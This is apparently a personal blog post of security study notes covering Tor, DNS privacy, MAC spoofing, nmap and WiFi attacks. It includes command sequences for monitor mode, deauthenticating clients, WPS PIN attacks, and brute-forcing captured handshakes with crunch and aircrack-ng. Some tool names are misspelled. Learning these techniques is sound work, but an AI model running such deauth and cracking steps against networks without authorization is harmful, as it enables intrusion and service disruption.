---
title      : "Environment Setup"
date       : 2019-08-09T22:50:57+02:00
publishdate: 2019-08-10T22:50:57+02:00
draft      : false
comments   : true
weight     : 5
revision   : 0
series:
- Security
categories:
- development
tags:
---

[DKMS](https://wiki.archlinux.org/index.php/Dynamic_Kernel_Module_Support)
: Dynamic Kernel Module System
* Linux kernel modules whose sources generally reside outside the kernel source tree
<!-- more -->

```
apt install -y dkms linux-headers-$(uname -r)
```

VM guest additions module

> Do not run tor as root, infact do not browse as root

* [Running tor is punishable for 3 years in Germany](https://www.privateinternetaccess.com/blog/2019/03/germany-considers-amendment-to-law-which-makes-it-illegal-to-run-a-tor-node-or-website/)
* hidden wiki
* proxychains
  * `proxychains firefox www.duckduckgo.com`
* [Countries which are censored for using tor](https://protonvpn.com/blog/are-vpns-illegal/)
* DNS Servers `/etc/resolv.conf`
  * `/etc/dhcp/dhclient.conf`
  * HIding DNS from our service provider
  * DNS Book
  * DNSleak
* Change MAC address - Media access control
  * `macchanger`
  * prent to be someone else computer, like other person in school, office
  * script to change mac Address at every reboot
    * `@reboot` in crontab entries
* IP address physical location
  * search engine `what is <IP>`
  * [iplookup](https://ipinfo.io/)
  * `nslookup
* by default `nmap` will scan for `1000` ports
  * save `nmap` output to a file, then manupulate it with `grep` and `awk`
  * [exploit-db](https://www.exploit-db.com/)

## Wireless

* `aircarch-ng`
  * `reaver` - WiFi Protected Setup Attack Tool, PIN
  * `crunch` - generate wordlists from a character set
  * pipe `crunch` output to `aircrack-ng` to for `WEP`
  * [Interface in **Monitor Mode**](https://askubuntu.com/questions/512926/how-to-configure-wifi-adaptor-to-monitor-mode)
    * [Promiscuous mode](https://en.wikipedia.org/wiki/Promiscuous_mode)
  * `wash --interface=wlan0` for `WPS`
    * search on internet which router model you are attacking for Lockout attempts
      * then plan attack accordingly
      * 2 attempts every 60 seconds `2:60`

```
ifconfig wlp2s0 down
iwconfig wlp2s0 mode monitor
ifconfig wlp2s0 up
watch --differences 'cat /proc/net/wireless'
airmon-ng check wlan0
airodump-ng wlan0
nmcli device wifi list
airodump-ng --bssid <> -c <> -w <file> wlan0

# Deauthenticate
airplay-ng -0 0 -a <BSSID> wlan0

crunch 11 11 -t %%%%hunder 1234567890 \
| aircrack-ng -w - SCAN_test01.cap -e <wifiName>
```

* Use `timeout` to run a command for certain time
* Run brute force attack in multiple machines
* 192.168.1.* - wired connection
* 192.168.0.* - wireless connection

### Footnotes

[^1]: https://en.wikipedia.org/wiki/Kevin_Mitnick
[^2]:
